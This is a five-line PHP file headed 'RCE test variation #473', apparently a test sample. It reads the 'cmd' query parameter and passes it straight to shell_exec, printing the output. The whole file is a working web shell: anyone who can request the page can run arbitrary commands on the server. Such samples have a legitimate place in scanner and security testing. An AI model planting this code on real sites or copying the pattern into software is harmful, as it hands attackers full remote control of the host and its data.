<?php
// RCE test variation #473
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>